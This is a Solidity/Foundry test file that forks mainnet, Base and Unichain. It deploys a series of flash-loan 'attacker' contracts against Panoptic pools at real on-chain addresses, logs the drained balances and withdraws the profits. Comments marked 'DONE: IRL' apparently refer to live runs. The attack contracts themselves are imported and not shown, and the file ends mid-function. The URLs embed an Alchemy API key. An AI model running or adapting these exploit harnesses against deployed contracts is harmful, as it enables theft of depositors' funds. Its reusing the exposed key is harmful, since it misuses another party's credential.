// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {USDC_WETH30bpsMainnetAttacker_Deployer, USDC_WETH30bpsMainnetAttacker} from "../../../script/attacker-contracts/Deployable_USDC_WETH30bpsMainnetAttacker.sol";
import {WBTC_WETH30bpsMainnetAttacker_Deployer, WBTC_WETH30bpsMainnetAttacker} from "../../../script/attacker-contracts/Deployable_WBTC_WETH30bpsMainnetAttacker.sol";
import {ETH_USDC5bpsUnichainAttacker_Deployer, ETH_USDC5bpsUnichainAttacker} from "../../../script/attacker-contracts/Deployable_ETH_USDC_5bpsUnichain.sol";
import {ETH_USDC5bpsBaseAttacker_Deployer, ETH_USDC5bpsBaseAttacker} from "../../../script/attacker-contracts/Deployable_ETH_USDC_5bpsBase.sol";
import {USDC_cbBTC30bpsBaseAttacker_Deployer, USDC_cbBTC30bpsBaseAttacker} from "../../../script/attacker-contracts/Deployable_USDC_cbBTC_30bpsBase.sol";
import {WBTC_USDC30bpsMainnetAttacker_Deployer, WBTC_USDC30bpsMainnetAttacker} from "../../../script/attacker-contracts/Deployable_WBTC_USDC30bpsMainnetAttacker.sol";
import {WETH_USDC5bpsBaseAttacker_Deployer, WETH_USDC5bpsBaseAttacker} from "../../../script/attacker-contracts/Deployable_WETH_USDC_5bpsBase.sol";
import {ETH_USDC5bpsMainnetAttacker_Deployer, ETH_USDC5bpsMainnetAttacker} from "../../../script/attacker-contracts/Deployable_ETH_USDC_5bpsMainnet.sol";
import {WETH_USDC5bpsUnichainAttacker_Deployer, WETH_USDC5bpsUnichainAttacker} from "../../../script/attacker-contracts/Deployable_WETH_USDC_5bpsUnichain.sol";
import {TBTC_WETH30bpsMainnetAttacker_Deployer, TBTC_WETH30bpsMainnetAttacker} from "../../../script/attacker-contracts/Deployable_TBTC_WETH30bpsMainnet.sol";
import {ETH_USDT5bpsUnichainAttacker_Deployer, ETH_USDT5bpsUnichainAttacker} from "../../../script/attacker-contracts/Deployable_ETH_USDT_5bpsUnichain.sol";
import {WBTC_USDT5bpsUnichainAttacker_Deployer, WBTC_USDT5bpsUnichainAttacker} from "../../../script/attacker-contracts/Deployable_WBTC_USDT5bpsUnichain.sol";
import {WBTC_USDC30bpsUnichainAttacker_Deployer, WBTC_USDC30bpsUnichainAttacker} from "../../../script/attacker-contracts/Deployable_WBTC_USDC30bpsUnichain.sol";
import {WETH_cbBTC30bpsBaseAttacker_Deployer, WETH_cbBTC30bpsBaseAttacker} from "../../../script/attacker-contracts/Deployable_WETH_cbBTC30bpsBase.sol";
import {ETH_WBTC5bpsUnichainAttacker_Deployer, ETH_WBTC5bpsUnichainAttacker} from "../../../script/attacker-contracts/Deployable_ETH_WBTC_5bpsUnichain.sol";
import {MultipoolMainnetAttacker} from "../../../script/attacker-contracts/MultipoolMainnetAttacker.sol";
import {IERC20Partial, ICollateralTracker} from "./Interfaces.sol";
import {PanopticMath} from "@libraries/PanopticMath.sol";
import {TokenId} from "@types/TokenId.sol";

contract TestDeployableAttackers is Test {

    function setUp() public {}

    address withdrawer = address(0x777);

    // DONE: IRL
    function test_mainnet_attacker_DeployableTakeFlashLoanAndAttack_Deployable_USDC_WETH30bpsMainnetAttacker() public {
        vm.createSelectFork("mainnet");

        IERC20Partial USDC = IERC20Partial(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        IERC20Partial WETH = IERC20Partial(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        ICollateralTracker tracker0 = ICollateralTracker(address(0xc74dC5908E3E421004f533287c052bF0cc42ddc1));
        ICollateralTracker tracker1 = ICollateralTracker(address(0x351eFb333885c5351418aE0134dd54cac0B3143F));
        address pp = 0x000000000000305B8621e2475aee38ab5721D525;

        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets before attack:", poolAssets0Before);
        console.log("ct1.poolAssets before attack:", poolAssets1Before);
        console.log("USDC.balanceOf PanopticPool before attack:", USDC.balanceOf(pp));
        console.log("WETH.balanceOf PanopticPool before attack:", WETH.balanceOf(pp));

        // Deploy and attack in one call:
        bytes32 salt = bytes32(uint256(0x123));
        USDC_WETH30bpsMainnetAttacker_Deployer attackerDeployer = new USDC_WETH30bpsMainnetAttacker_Deployer{salt: salt}(withdrawer);
        console.log("AttackerDeployer deployed at:", address(attackerDeployer));
        USDC_WETH30bpsMainnetAttacker attacker = attackerDeployer.attacker();
        console.log("Attacker deployed at:", address(attacker));

        console.log("USDC balance of attacker contract after attack:", USDC.balanceOf(address(attacker)));
        console.log("WETH balance of attacker contract after attack:", WETH.balanceOf(address(attacker)));
        (uint256 poolAssets0After, , ) = tracker0.getPoolData();
        (uint256 poolAssets1After, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets after attack:", poolAssets0After);
        console.log("ct1.poolAssets after attack:", poolAssets1After);
        console.log("USDC.balanceOf PanopticPool after attack:", USDC.balanceOf(pp));
        console.log("WETH.balanceOf PanopticPool after attack:", WETH.balanceOf(pp));

        console.log("balance of withdrawer before withdraw", WETH.balanceOf(withdrawer));
        vm.prank(withdrawer);
        attacker.withdraw(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 100000000001);
        console.log("balance of withdrawer after withdraw", WETH.balanceOf(withdrawer));
    }

    // DONE: IRL
    function test_mainnet_attacker_testDeployableTakeFlashLoanAndAttack_Deployable_WBTC_WETH30bpsMainnetAttacker() public {
        vm.createSelectFork("mainnet");

        IERC20Partial WBTC = IERC20Partial(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
        IERC20Partial WETH = IERC20Partial(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        ICollateralTracker tracker0 = ICollateralTracker(address(0xb310cf625f519DA965c587e22Ff6Ecb49809eD09));
        ICollateralTracker tracker1 = ICollateralTracker(address(0x1F8D600A0211DD76A8c1Ac6065BC0816aFd118ef));
        address pp = 0x000000000000100921465982d28b37D2006e87Fc;

        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets before attack:", poolAssets0Before);
        console.log("ct1.poolAssets before attack:", poolAssets1Before);
        console.log("WBTC.balanceOf PanopticPool before attack:", WBTC.balanceOf(pp));
        console.log("WETH.balanceOf PanopticPool before attack:", WETH.balanceOf(pp));

        // Deploy and attack in one call:
        bytes32 salt = bytes32(uint256(0x123));
        WBTC_WETH30bpsMainnetAttacker_Deployer attackerDeployer = new WBTC_WETH30bpsMainnetAttacker_Deployer{salt: salt}(withdrawer);
        console.log("AttackerDeployer deployed at:", address(attackerDeployer));
        WBTC_WETH30bpsMainnetAttacker attacker = attackerDeployer.attacker();
        console.log("Attacker deployed at:", address(attacker));

        console.log("WBTC balance of attacker contract after attack:", WBTC.balanceOf(address(attacker)));
        console.log("WETH balance of attacker contract after attack:", WETH.balanceOf(address(attacker)));

        (uint256 poolAssets0After, , ) = tracker0.getPoolData();
        (uint256 poolAssets1After, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets after attack:", poolAssets0After);
        console.log("ct1.poolAssets after attack:", poolAssets1After);
        console.log("WBTC.balanceOf PanopticPool after attack:", WBTC.balanceOf(pp));
        console.log("WETH.balanceOf PanopticPool after attack:", WETH.balanceOf(pp));

        console.log("balance of withdrawer before withdraw", WETH.balanceOf(withdrawer));
        vm.prank(withdrawer);
        attacker.withdraw(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 100000000001);
        console.log("balance of withdrawer after withdraw", WETH.balanceOf(withdrawer));
    }

    address UNICHAIN_POOL_MANAGER_V4 = 0x1F98400000000000000000000000000000000004;

    // DONE: IRL
    function test_unichain_attacker_testDeployableTakeFlashLoanAndAttack_Deployable_ETH_USDC_5bpsUnichainAttacker() public {
        vm.createSelectFork("https://unichain-mainnet.g.alchemy.com/v2/VN5K96b647acOyIXfX45zBdO53Dx7ZKm");

        // This attacker is going to keep its profits in WETH, despite token0 being ETH:
        IERC20Partial WETH = IERC20Partial(0x4200000000000000000000000000000000000006);
        IERC20Partial USDC = IERC20Partial(0x078D782b760474a361dDA0AF3839290b0EF57AD6);
        ICollateralTracker tracker0 = ICollateralTracker(address(0xb3DeeEE00B28b27845E410D8e8e141F0A0A7d87F));
        ICollateralTracker tracker1 = ICollateralTracker(address(0xf40BaA5F85e8CeD1a1dd2d92055C06469965469E));
        address pp = 0x000003493cb99a8C1E4F103D2b6333E4d195DF7d;

        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets before attack:", poolAssets0Before);
        console.log("ct1.poolAssets before attack:", poolAssets1Before);
        console.log("ETH.balanceOf UNICHAIN_POOL_MANAGER_V4 before attack:", address(UNICHAIN_POOL_MANAGER_V4).balance);
        console.log("USDC.balanceOf UNICHAIN_POOL_MANAGER_V4 before attack:", USDC.balanceOf(UNICHAIN_POOL_MANAGER_V4));

        // Deploy and attack in one call:
        bytes32 salt = bytes32(uint256(0x123));
        ETH_USDC5bpsUnichainAttacker_Deployer attackerDeployer = new ETH_USDC5bpsUnichainAttacker_Deployer{salt: salt}(withdrawer);
        console.log("AttackerDeployer deployed at:", address(attackerDeployer));
        ETH_USDC5bpsUnichainAttacker attacker = attackerDeployer.attacker();
        console.log("Attacker deployed at:", address(attacker));

        console.log("WETH balance of attacker contract after attack:", WETH.balanceOf(address(attacker)));
        console.log("ETH balance of attacker contract after attack (should be ~zero - we kept profits in WETH)", address(attacker).balance);
        console.log("USDC balance of attacker contract after attack:", USDC.balanceOf(address(attacker)));

        (uint256 poolAssets0After, , ) = tracker0.getPoolData();
        (uint256 poolAssets1After, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets after attack:", poolAssets0After);
        console.log("ct1.poolAssets after attack:", poolAssets1After);
        console.log("ETH.balanceOf UNICHAIN_POOL_MANAGER_V4 after attack:", address(UNICHAIN_POOL_MANAGER_V4).balance);
        console.log("USDC.balanceOf UNICHAIN_POOL_MANAGER_V4 after attack:", USDC.balanceOf(UNICHAIN_POOL_MANAGER_V4));

        console.log("balance of withdrawer before withdraw", WETH.balanceOf(withdrawer));
        vm.prank(withdrawer);
        attacker.withdraw(address(WETH), 100000000001);
        console.log("balance of withdrawer after withdraw", WETH.balanceOf(withdrawer));
    }

    address BASE_POOL_MANAGER_V4 = 0x498581fF718922c3f8e6A244956aF099B2652b2b;

    // DONE: IRL
    function test_base_attacker_testDeployableTakeFlashLoanAndAttack_Deployable_ETH_USDC_5bpsBaseAttacker() public {
        vm.createSelectFork("https://base-mainnet.g.alchemy.com/v2/VN5K96b647acOyIXfX45zBdO53Dx7ZKm");

        // This attacker is going to keep its profits in WETH, despite token0 being ETH:
        IERC20Partial WETH = IERC20Partial(0x4200000000000000000000000000000000000006);
        IERC20Partial USDC = IERC20Partial(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
        ICollateralTracker tracker0 = ICollateralTracker(address(0x636aEE6946Bbd338334504D01AA15B3Bc4AD8c19));
        ICollateralTracker tracker1 = ICollateralTracker(address(0xAbbAD7A755BDF9bBeC357e2bDf4C02934a8D7A71));
        address pp = 0x36a3088B94f73853a3964a0352B47605C6354f27;

        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets before attack:", poolAssets0Before);
        console.log("ct1.poolAssets before attack:", poolAssets1Before);
        console.log("ETH.balanceOf BASE_POOL_MANAGER_V4 before attack:", address(BASE_POOL_MANAGER_V4).balance);
        console.log("USDC.balanceOf BASE_POOL_MANAGER_V4 before attack:", USDC.balanceOf(BASE_POOL_MANAGER_V4));

        // Deploy and attack in one call:
        bytes32 salt = bytes32(uint256(0x123));
        ETH_USDC5bpsBaseAttacker_Deployer attackerDeployer = new ETH_USDC5bpsBaseAttacker_Deployer{salt: salt}(withdrawer);
        console.log("AttackerDeployer deployed at:", address(attackerDeployer));
        ETH_USDC5bpsBaseAttacker attacker = attackerDeployer.attacker();
        console.log("Attacker deployed at:", address(attacker));

        console.log("WETH balance of attacker contract after attack:", WETH.balanceOf(address(attacker)));
        console.log("ETH balance of attacker contract after attack (should be ~zero - we kept profits in WETH)", address(attacker).balance);
        console.log("USDC balance of attacker contract after attack:", USDC.balanceOf(address(attacker)));

        (uint256 poolAssets0After, , ) = tracker0.getPoolData();
        (uint256 poolAssets1After, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets after attack:", poolAssets0After);
        console.log("ct1.poolAssets after attack:", poolAssets1After);
        console.log("ETH.balanceOf BASE_POOL_MANAGER_V4 after attack:", address(BASE_POOL_MANAGER_V4).balance);
        console.log("USDC.balanceOf BASE_POOL_MANAGER_V4 after attack:", USDC.balanceOf(BASE_POOL_MANAGER_V4));

        console.log("balance of withdrawer before withdraw", WETH.balanceOf(withdrawer));
        vm.prank(withdrawer);
        attacker.withdraw(address(WETH), 100000000001);
        console.log("balance of withdrawer after withdraw", WETH.balanceOf(withdrawer));
    }

    // DONE: IRL
    function test_base_attacker_testDeployableTakeFlashLoanAndAttack_Deployable_USDC_cbBTC_30bpsBaseAttacker() public {
        vm.createSelectFork("https://base-mainnet.g.alchemy.com/v2/VN5K96b647acOyIXfX45zBdO53Dx7ZKm");

        IERC20Partial USDC = IERC20Partial(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
        IERC20Partial cbBTC = IERC20Partial(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf);
        ICollateralTracker tracker0 = ICollateralTracker(address(0x02E142e535efc136eDE67D6DD39BD26BC945393B));
        ICollateralTracker tracker1 = ICollateralTracker(address(0xB324A82b9AaAe1318CFeac1bdf0957BBd6f6C3E3));
        address pp = 0x128f822727193887ffc4186B556F2D68e60dC330;

        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets before attack:", poolAssets0Before);
        console.log("ct1.poolAssets before attack:", poolAssets1Before);
        console.log("USDC.balanceOf BASE_POOL_MANAGER_V4 before attack:", USDC.balanceOf(BASE_POOL_MANAGER_V4));
        console.log("cbBTC.balanceOf BASE_POOL_MANAGER_V4 before attack:", cbBTC.balanceOf(BASE_POOL_MANAGER_V4));

        // Deploy and attack in one call:
        bytes32 salt = bytes32(uint256(0x123));
        USDC_cbBTC30bpsBaseAttacker_Deployer attackerDeployer = new USDC_cbBTC30bpsBaseAttacker_Deployer{salt: salt}(withdrawer);
        console.log("AttackerDeployer deployed at:", address(attackerDeployer));
        USDC_cbBTC30bpsBaseAttacker attacker = attackerDeployer.attacker();
        console.log("Attacker deployed at:", address(attacker));

        console.log("USDC balance of attacker contract after attack:", USDC.balanceOf(address(attacker)));
        console.log("cbBTC balance of attacker contract after attack:", cbBTC.balanceOf(address(attacker)));

        (uint256 poolAssets0After, , ) = tracker0.getPoolData();
        (uint256 poolAssets1After, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets after attack:", poolAssets0After);
        console.log("ct1.poolAssets after attack:", poolAssets1After);
        console.log("USDC.balanceOf BASE_POOL_MANAGER_V4 after attack:", USDC.balanceOf(BASE_POOL_MANAGER_V4));
        console.log("cbBTC.balanceOf BASE_POOL_MANAGER_V4 after attack:", cbBTC.balanceOf(BASE_POOL_MANAGER_V4));

        console.log("cbBTC balance of withdrawer before withdraw", cbBTC.balanceOf(withdrawer));
        vm.prank(withdrawer);
        attacker.withdraw(address(cbBTC), 5000000);
        console.log("cbBTC balance of withdrawer after withdraw", cbBTC.balanceOf(withdrawer));
    }

    // DONE: IRL
    function test_mainnet_attacker_testDeployableTakeFlashLoanAndAttack_Deployable_WBTC_USDC30bpsMainnetAttacker() public {
        vm.createSelectFork("mainnet");

        IERC20Partial WBTC = IERC20Partial(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
        IERC20Partial USDC = IERC20Partial(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        ICollateralTracker tracker0 = ICollateralTracker(address(0x4cEeC889fB484E18522224E9C1d7b0fB8526D710));
        ICollateralTracker tracker1 = ICollateralTracker(address(0x6a0B5d5aFfA5a0b7dD776Db96ee79F609394B5Da));
        address pp = 0x05b142597bedb8cA19BE81E97c684ede8C091DE8;

        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets before attack:", poolAssets0Before);
        console.log("ct1.poolAssets before attack:", poolAssets1Before);
        console.log("WBTC.balanceOf PanopticPool before attack:", WBTC.balanceOf(pp));
        console.log("USDC.balanceOf PanopticPool before attack:", USDC.balanceOf(pp));

        // Deploy and attack in one call:
        bytes32 salt = bytes32(uint256(0x123));
        WBTC_USDC30bpsMainnetAttacker_Deployer attackerDeployer = new WBTC_USDC30bpsMainnetAttacker_Deployer{salt: salt}(withdrawer);
        console.log("AttackerDeployer deployed at:", address(attackerDeployer));
        WBTC_USDC30bpsMainnetAttacker attacker = attackerDeployer.attacker();
        console.log("Attacker deployed at:", address(attacker));

        console.log("WBTC balance of attacker contract after attack:", WBTC.balanceOf(address(attacker)));
        console.log("USDC balance of attacker contract after attack:", USDC.balanceOf(address(attacker)));

        (uint256 poolAssets0After, , ) = tracker0.getPoolData();
        (uint256 poolAssets1After, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets after attack:", poolAssets0After);
        console.log("ct1.poolAssets after attack:", poolAssets1After);
        console.log("WBTC.balanceOf PanopticPool after attack:", WBTC.balanceOf(pp));
        console.log("USDC.balanceOf PanopticPool after attack:", USDC.balanceOf(pp));

        console.log("balance of withdrawer before withdraw", USDC.balanceOf(withdrawer));
        vm.prank(withdrawer);
        attacker.withdraw(address(USDC), 10001);
        console.log("balance of withdrawer after withdraw", USDC.balanceOf(withdrawer));
    }

    // DONE: IRL
    function test_base_attacker_testDeployableTakeFlashLoanAndAttack_Deployable_WETH_USDC5bpsBaseAttacker() public {
        vm.createSelectFork("https://base-mainnet.g.alchemy.com/v2/VN5K96b647acOyIXfX45zBdO53Dx7ZKm");

        IERC20Partial WETH = IERC20Partial(0x4200000000000000000000000000000000000006);
        IERC20Partial USDC = IERC20Partial(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
        ICollateralTracker tracker0 = ICollateralTracker(address(0x40F3316dFd1BCdA29Cbaf0E03d68aE221CA716e2));
        ICollateralTracker tracker1 = ICollateralTracker(address(0xb151B11B14cF2Fee78e83739e8cdf7047Dc54b7F));
        address pp = 0x000294305150d8A7Ae938cd0A798549d6D845e97;

        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets before attack:", poolAssets0Before);
        console.log("ct1.poolAssets before attack:", poolAssets1Before);
        console.log("WETH.balanceOf PanopticPool before attack:", WETH.balanceOf(pp));
        console.log("USDC.balanceOf PanopticPool before attack:", USDC.balanceOf(pp));

        // Deploy and attack in one call:
        bytes32 salt = bytes32(uint256(0x123));
        WETH_USDC5bpsBaseAttacker_Deployer attackerDeployer = new WETH_USDC5bpsBaseAttacker_Deployer{salt: salt}(withdrawer);
        console.log("AttackerDeployer deployed at:", address(attackerDeployer));
        WETH_USDC5bpsBaseAttacker attacker = attackerDeployer.attacker();
        console.log("Attacker deployed at:", address(attacker));

        console.log("WETH balance of attacker contract after attack:", WETH.balanceOf(address(attacker)));
        console.log("USDC balance of attacker contract after attack:", USDC.balanceOf(address(attacker)));

        (uint256 poolAssets0After, , ) = tracker0.getPoolData();
        (uint256 poolAssets1After, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets after attack:", poolAssets0After);
        console.log("ct1.poolAssets after attack:", poolAssets1After);
        console.log("WETH.balanceOf PanopticPool after attack:", WETH.balanceOf(pp));
        console.log("USDC.balanceOf PanopticPool after attack:", USDC.balanceOf(pp));

        console.log("balance of withdrawer before withdraw", USDC.balanceOf(withdrawer));
        vm.prank(withdrawer);
        attacker.withdraw(address(USDC), 10001);
        console.log("balance of withdrawer after withdraw", USDC.balanceOf(withdrawer));
    }

    address constant MAINNET_POOL_MANAGER_V4 = 0x000000000004444c5dc75cB358380D2e3dE08A90;

    // Done: IRL
    function test_mainnet_attacker_testDeployableTakeFlashLoanAndAttack_Deployable_ETH_USDC5bpsMainnetAttacker() public {
        vm.createSelectFork("mainnet");

        // This attacker is going to keep its profits in WETH, despite token0 being ETH:
        IERC20Partial WETH = IERC20Partial(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        IERC20Partial USDC = IERC20Partial(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        ICollateralTracker tracker0 = ICollateralTracker(address(0x25d2c450078BB12d858cC86e057974fdE5dE55e2));
        ICollateralTracker tracker1 = ICollateralTracker(address(0x5141069163664fb6FA2E8563191cF4ddB9783e0A));
        address pp = 0xdfbfe4c03508648589120350f96E05c780EB6e50;

        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets before attack:", poolAssets0Before);
        console.log("ct1.poolAssets before attack:", poolAssets1Before);
        console.log("ETH.balanceOf MAINNET_POOL_MANAGER_V4 before attack:", address(MAINNET_POOL_MANAGER_V4).balance);
        console.log("USDC.balanceOf MAINNET_POOL_MANAGER_V4 before attack:", USDC.balanceOf(MAINNET_POOL_MANAGER_V4));

        // Deploy and attack in one call:
        bytes32 salt = bytes32(uint256(0x123));
        ETH_USDC5bpsMainnetAttacker_Deployer attackerDeployer = new ETH_USDC5bpsMainnetAttacker_Deployer{salt: salt}(withdrawer);
        console.log("AttackerDeployer deployed at:", address(attackerDeployer));
        ETH_USDC5bpsMainnetAttacker attacker = attackerDeployer.attacker();
        console.log("Attacker deployed at:", address(attacker));

        console.log("WETH balance of attacker contract after attack:", WETH.balanceOf(address(attacker)));
        console.log("ETH balance of attacker contract after attack (should be ~zero - we kept profits in WETH)", address(attacker).balance);
        console.log("USDC balance of attacker contract after attack:", USDC.balanceOf(address(attacker)));

        (uint256 poolAssets0After, , ) = tracker0.getPoolData();
        (uint256 poolAssets1After, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets after attack:", poolAssets0After);
        console.log("ct1.poolAssets after attack:", poolAssets1After);
        console.log("ETH.balanceOf MAINNET_POOL_MANAGER_V4 after attack:", address(MAINNET_POOL_MANAGER_V4).balance);
        console.log("USDC.balanceOf MAINNET_POOL_MANAGER_V4 after attack:", USDC.balanceOf(MAINNET_POOL_MANAGER_V4));

        console.log("balance of withdrawer before withdraw", WETH.balanceOf(withdrawer));
        vm.prank(withdrawer);
        attacker.withdraw(address(WETH), 100000000001);
        console.log("balance of withdrawer after withdraw", WETH.balanceOf(withdrawer));
    }

    // DONE: IRL
    function test_unichain_attacker_testDeployableTakeFlashLoanAndAttack_Deployable_WETH_USDC5bpsUnichainAttacker() public {
        vm.createSelectFork("https://unichain-mainnet.g.alchemy.com/v2/VN5K96b647acOyIXfX45zBdO53Dx7ZKm");

        IERC20Partial WETH = IERC20Partial(0x4200000000000000000000000000000000000006);
        IERC20Partial USDC = IERC20Partial(0x078D782b760474a361dDA0AF3839290b0EF57AD6);
        ICollateralTracker tracker0 = ICollateralTracker(address(0xE5565daeE2ccDD18736AD8B1A279A43626bbf369));
        ICollateralTracker tracker1 = ICollateralTracker(address(0x607435A33C4310A98A8Ff67C40d02FD3ED2020dB));
        address pp = 0x000EC408A89688b5E5501C6a60EF18f13dB40F06;

        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets before attack:", poolAssets0Before);
        console.log("ct1.poolAssets before attack:", poolAssets1Before);
        console.log("WETH.balanceOf PanopticPool before attack:", WETH.balanceOf(pp));
        console.log("USDC.balanceOf PanopticPool before attack:", USDC.balanceOf(pp));

        // Deploy and attack in one call:
        bytes32 salt = bytes32(uint256(0x123));
        WETH_USDC5bpsUnichainAttacker_Deployer attackerDeployer = new WETH_USDC5bpsUnichainAttacker_Deployer{salt: salt}(withdrawer);
        console.log("AttackerDeployer deployed at:", address(attackerDeployer));
        WETH_USDC5bpsUnichainAttacker attacker = attackerDeployer.attacker();
        console.log("Attacker deployed at:", address(attacker));

        console.log("WETH balance of attacker contract after attack:", WETH.balanceOf(address(attacker)));
        console.log("USDC balance of attacker contract after attack:", USDC.balanceOf(address(attacker)));

        (uint256 poolAssets0After, , ) = tracker0.getPoolData();
        (uint256 poolAssets1After, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets after attack:", poolAssets0After);
        console.log("ct1.poolAssets after attack:", poolAssets1After);
        console.log("WETH.balanceOf PanopticPool after attack:", WETH.balanceOf(pp));
        console.log("USDC.balanceOf PanopticPool after attack:", USDC.balanceOf(pp));

        console.log("balance of withdrawer before withdraw", USDC.balanceOf(withdrawer));
        vm.prank(withdrawer);
        attacker.withdraw(address(USDC), 10001);
        console.log("balance of withdrawer after withdraw", USDC.balanceOf(withdrawer));
    }

    // DONE: IRL
    function test_mainnet_attacker_testDeployableTakeFlashLoanAndAttack_Deployable_TBTC_WETH30bpsMainnetAttacker() public {
        vm.createSelectFork("mainnet");

        IERC20Partial TBTC = IERC20Partial(0x18084fbA666a33d37592fA2633fD49a74DD93a88);
        IERC20Partial WETH = IERC20Partial(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        ICollateralTracker tracker0 = ICollateralTracker(address(0xD832250205607FAFcf01c94971af0295f08aC631));
        ICollateralTracker tracker1 = ICollateralTracker(address(0xe0b058AEbFed7e03494dA2644380F8C0BC706F1e));
        address pp = 0x0d694230686C1973E8ED8b607f48D3B0Dc5A2bF1;

        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets before attack:", poolAssets0Before);
        console.log("ct1.poolAssets before attack:", poolAssets1Before);
        console.log("TBTC.balanceOf PanopticPool before attack:", TBTC.balanceOf(pp));
        console.log("WETH.balanceOf PanopticPool before attack:", WETH.balanceOf(pp));

        // Deploy and attack in one call:
        bytes32 salt = bytes32(uint256(0x123));
        TBTC_WETH30bpsMainnetAttacker_Deployer attackerDeployer = new TBTC_WETH30bpsMainnetAttacker_Deployer{salt: salt}(withdrawer);
        console.log("AttackerDeployer deployed at:", address(attackerDeployer));
        TBTC_WETH30bpsMainnetAttacker attacker = attackerDeployer.attacker();
        console.log("Attacker deployed at:", address(attacker));

        console.log("TBTC balance of attacker contract after attack:", TBTC.balanceOf(address(attacker)));
        console.log("WETH balance of attacker contract after attack:", WETH.balanceOf(address(attacker)));

        (uint256 poolAssets0After, , ) = tracker0.getPoolData();
        (uint256 poolAssets1After, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets after attack:", poolAssets0After);
        console.log("ct1.poolAssets after attack:", poolAssets1After);
        console.log("TBTC.balanceOf PanopticPool after attack:", TBTC.balanceOf(pp));
        console.log("WETH.balanceOf PanopticPool after attack:", WETH.balanceOf(pp));

        console.log("balance of withdrawer before withdraw", WETH.balanceOf(withdrawer));
        vm.prank(withdrawer);
        attacker.withdraw(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 100000000001);
        console.log("balance of withdrawer after withdraw", WETH.balanceOf(withdrawer));
    }

    // DONE: TO RETRY. Required a fix to attackAmount
    function test_unichain_attacker_testDeployableTakeFlashLoanAndAttack_Deployable_ETH_USDT_5bpsUnichainAttacker() public {
        vm.createSelectFork("https://unichain-mainnet.g.alchemy.com/v2/VN5K96b647acOyIXfX45zBdO53Dx7ZKm");

        // This attacker is going to keep its profits in WETH, despite token0 being ETH:
        IERC20Partial WETH = IERC20Partial(0x4200000000000000000000000000000000000006);
        IERC20Partial USDT = IERC20Partial(0x9151434b16b9763660705744891fA906F660EcC5);
        ICollateralTracker tracker0 = ICollateralTracker(address(0x6F1bB1226B7dA982194444Ffae8418c7a9EF1DE9));
        ICollateralTracker tracker1 = ICollateralTracker(address(0xFF95846A7c70a4525Ffa95FAD0b7ce010b3cA56f));
        address pp = 0x0000eD265C5EDAa58C3eAF503F8bFE2ccaB1C0aD;

        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        console.log("ct0.poolAssets before attack:", poolAssets0Before);
        console.log("ct1.poolAssets before attack:", poolAssets1Before);
        console.log("ETH.balanceOf UNICHAIN_POOL_MANAGER_V4 before attack:", address(UNICHAIN_POOL_MANAGER_V4).balance);
        console.log("USDT.balanceOf UNICHAIN_POOL_MANAGER_V4 before attack:", USDT.balanceOf(UNICHAIN_POOL_MANAGER_V4));

        // Deploy and attack in one call:
        bytes32 salt = bytes32(uint256(0x123));
        ETH_USDT5bpsUnichainAttacker_Deployer attackerDeployer = new ETH_USDT5bpsUnichainAttacker_Deployer{salt: salt}(withdrawer);
        console.log("AttackerDeployer deployed at:", address(attackerDeployer));
        ETH_USDT5bpsUnichainAttacker attacker = attackerDeployer.attacker();
        console.log("Attacker deployed at:", address(attacker));

        console.log("WETH balance of attacker contract after attack:", WETH.balanceOf(address(attacker)));
        console.log("ETH balance of attacker contract after attack (should be ~zero - we kept profits in WETH)", address(attacker).balance);
        console.log("USDT balance of attacker contract after attack:", USDT.balanceOf(address(attacker)));

        (uint256 poolAssets0After, , ) = tracker0.getPoolData();
        (uint256 poolAssets1After, , ) = tracker1.getPoolData();
